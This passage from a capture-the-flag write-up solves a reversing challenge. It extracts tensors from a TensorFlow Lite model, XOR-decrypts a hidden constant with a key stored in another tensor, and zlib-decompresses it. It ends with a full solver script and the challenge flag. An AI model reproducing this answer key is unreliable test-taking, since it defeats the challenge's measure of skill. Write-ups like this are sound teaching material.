StatefulPartitionedCall_1:0
StatefulPartitionedCall_1:1
functional_2_1/meta_holder_1/MatMul
arith.constant
serving_default_in_meta:0
serving_default_in_payload:0
```

**Step 2: Extracting Model Tensors**

Use TensorFlow Lite in Python to extract all tensor data from the file:

```python
import tensorflow as tf

interpreter = tf.lite.Interpreter(model_path="snownet_stronger.tflite")
interpreter.allocate_tensors()

for tensor in interpreter.get_tensor_details():
  name = tensor['name']
  data = interpreter.get_tensor(tensor['index'])
  print(f"{name}: {data.tobytes().hex()}")
```

- The 36 bytes from `arith.constant` are the encrypted flag.
- The 16 bytes from `meta_holder` (patterned as `[0x6b, 0x00, 0x40, 0x00, ...]`) encode the ASCII key "k3y!".

**Step 3: XOR Decryption**

Decrypt using the key `k3y!` (from the `meta_holder` tensor), repeating as needed:

```python
encrypted = bytes.fromhex("13af8a291a990fef5a1b3488e7444f0959bd76134500570b5d7dd0246b5e5b29e3000000")
key = b'k3y!'
xor_decrypted = bytes([b ^ key[i % 4] for i, b in enumerate(encrypted)])
```

**Step 4: Zlib Decompression**

The decrypted bytes start with `0x78 0x9c` (zlib compression marker). Decompress:

```python
import zlib
flag = zlib.decompress(xor_decrypted).decode()
```

**Step 5: Output**

The decompressed string is your flag. Here's my final solver script (using tensorflow) library.

```python
#!/usr/bin/env python3

import tensorflow as tf
import numpy as np
import zlib

def extract_key_from_meta_holder(data):
  """Extract key from pattern XX 00 40 00 -> take XX"""
  key = b''
  for i in range(0, len(data), 4):
    key += bytes([data[i]])
  return key

print("[+] Loading TFLite model...")
interpreter = tf.lite.Interpreter(model_path="snownet_stronger.tflite")
interpreter.allocate_tensors()

encrypted_data = None
key = None

# Extract encrypted data and key
for tensor in interpreter.get_tensor_details():
  name = tensor['name']
  data = interpreter.get_tensor(tensor['index'])
  raw_bytes = data.tobytes()
  
  if 'arith.constant' in name:
    encrypted_data = raw_bytes
    print(f"[+] Found encrypted data in '{name}'")
    print(f"    Length: {len(raw_bytes)} bytes")
  
  if 'meta_holder' in name:
    key = extract_key_from_meta_holder(raw_bytes)
    print(f"[+] Found key in '{name}'")
    print(f"    Key: {key.decode('ascii')}")

if not encrypted_data or not key:
  print("[-] Failed to extract data or key!")
  exit(1)

print("\n[+] Step 1: XOR decryption...")
xor_decrypted = bytearray()
for i, byte in enumerate(encrypted_data):
  xor_decrypted.append(byte ^ key[i % len(key)])

print(f"    Result: {xor_decrypted[:10].hex()}... (starts with zlib magic 0x789c)")

print("\n[+] Step 2: zlib decompression...")
try:
  decompressed = zlib.decompress(bytes(xor_decrypted))
  flag = decompressed.decode('ascii').strip()
  
  print(f"\n{'='*70}")
  print(f"🎉 FLAG: {flag}")
  print(f"{'='*70}")
    
except Exception as e:
  print(f"[-] Error: {e}")
```

### Flag

{{< admonition type=question title="Click to show the flag" open=false >}}
  `HTB{Cl0udy_C0r3_R3v3rs3d}`
{{< /admonition >}}

